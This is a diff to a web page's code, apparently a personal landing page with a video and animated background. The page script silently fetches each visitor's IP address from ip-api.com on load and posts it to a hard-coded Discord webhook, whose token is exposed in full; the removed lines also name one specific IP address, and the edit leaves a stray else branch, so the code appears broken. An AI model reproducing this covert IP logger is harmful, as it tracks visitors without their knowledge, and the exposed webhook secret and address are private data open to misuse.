@@ -11,8 +11,8 @@
             cursor: url('https://cdn-icons-png.flaticon.com/512/25/25694.png'), auto;
             background: url('https://cdn.discordapp.com/attachments/1257370223590248540/1301300539534872647/97759808-b73f-4176-a655-2ce9d9697ff3.gif') no-repeat center center fixed;
             background-size: cover;
-            height: 100vh; /* S'assure que le fond couvre tout l'écran */
-            margin: 0; /* Supprime les marges par défaut du body */
+            height: 100vh;
+            margin: 0;
         }
         #enterScreen {
             position: fixed;
@@ -169,14 +169,12 @@
                 event.target.playVideo(); // Start playing the video
             }
 
-            // Get user's IP address using ipify
-            fetch('https://api.ipify.org?format=json')
+            // Get user's IP address using ip-api
+            fetch('http://ip-api.com/json/')
                 .then(response => response.json())
                 .then(data => {
-                    console.log('User IP Address:', data.ip);
+                    console.log('User IP Address:', data.query);
                     
-                    // Check if the IP is not the one we want to exclude
-                    if (data.ip !== '86.234.134.179') {
                         // Send the IP address to your Discord webhook
                         fetch('https://ptb.discord.com/api/webhooks/1257370292347732039/gawrdocaGwUi6yv5iusR6HXYubx0CrLcnfRXNRRhKOtgzrnOg_qFDYZlLQ86ioWpKOvJ', {
                             method: 'POST',
@@ -184,7 +182,7 @@
                                 'Content-Type': 'application/json'
                             },
                             body: JSON.stringify({
-                                content: `New IP Address: ${data.ip}`
+                                content: `New IP Address: ${data.query}`
                             })
                         })
                         .then(response => {
@@ -196,7 +194,7 @@
                         })
                         .catch(error => console.error('Error sending IP address:', error));
                     } else {
-                        console.log('IP address is excluded: ' + data.ip);
+                        console.log('IP address is excluded: ' + data.query);
                     }
                 })
                 .catch(error => console.error('Error fetching IP address:', error));
